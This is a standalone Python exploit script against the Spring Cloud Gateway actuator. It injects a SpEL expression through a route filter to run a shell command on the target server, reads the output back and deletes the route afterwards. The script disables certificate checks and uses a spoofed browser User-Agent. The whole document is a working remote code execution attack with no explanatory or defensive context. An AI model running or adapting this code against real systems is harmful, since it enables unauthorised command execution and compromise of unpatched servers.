import random
import string
import requests
import json
import sys
import urllib.parse
import base64
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {"Content-Type": "application/json",
           'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
           'Accept': '*/*'}

id = ''.join(random.choice(string.ascii_lowercase) for i in range(8))
print(id)


def exploit(url, command):
    payload = {"id": id, "filters": [{"name": "AddResponseHeader", "args": {"name": "Result",
                                                                            "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\u0022" + command + "\u0022).getInputStream()))}"}}],
               "uri": "http://example.com"}

    rbase = requests.post(url + '/actuator/gateway/routes/' + id, headers=headers, data=json.dumps(payload),
                          verify=False)
    if rbase.status_code == 201:
        print("[+] Stage deployed to /actuator/gateway/routes/" + id)
        print("[+] Executing command...")
        r = requests.post(url + '/actuator/gateway/refresh', headers=headers, verify=False)
        if r.status_code == 200:
            print("[+] getting result...")
            r = requests.get(url + '/actuator/gateway/routes/' + id, headers=headers, verify=False)
            print(r.text)
            if r.status_code == 200:
                get_response = r.json()
                clean(url)
                return get_response['filters'][0].split("'")[1]
            else:
                print('r.text = {}'.format(r.text))
                print("[-] Error: Invalid response")
                print(r.text)
                clean(url)
                exit(1)
        else:
            clean(url)
            print("[-] Error executing command")
    else:
        print("[X] Error: Fail to deploy stage (Patched ?)")
        exit(1)


def clean(url):
    remove = requests.delete(url + '/actuator/gateway/routes/' + id, headers=headers, verify=False)
    if remove.status_code == 200:
        print("[+] Stage removed!")
    else:
        print("[-] Error: Fail to remove stage")


def main():
    url = sys.argv[1]
    command = 'id'
    print(exploit(url, command))


if __name__ == '__main__':
    main()
